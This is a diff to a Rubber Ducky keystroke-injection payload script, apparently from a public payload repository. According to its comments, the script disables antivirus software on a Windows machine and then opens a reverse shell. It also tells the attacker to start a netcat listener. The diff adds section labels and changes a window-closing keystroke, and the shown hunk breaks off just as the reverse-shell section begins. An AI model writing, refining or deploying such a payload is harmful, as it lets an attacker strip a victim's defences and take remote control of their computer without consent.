@@ -3,6 +3,8 @@ REM Source: https://github.com/TylerPaplham/Rubber-Ducky-Payloads
 REM Ducky Script to disable AV and set up a reverse shell
 REM on attacker machine make sure to set up netcat using the following command "nc -lnvp <your_port>"
 REM ---------
+REM Disable AV
+REM ---------
 DELAY 1000
 CONTROL ESCAPE
 DELAY 500
@@ -24,10 +26,10 @@ SPACE
 DELAY 800
 ALT y
 DELAY 1500
-ALT SPACE
-DELAY 500
-STRING c
-REM Start of reverse shell
+ALT F4
+REM ---------
+REM Start of Reverse Shell
+REM ---------
 DELAY 1000
 GUI r
 DELAY 100
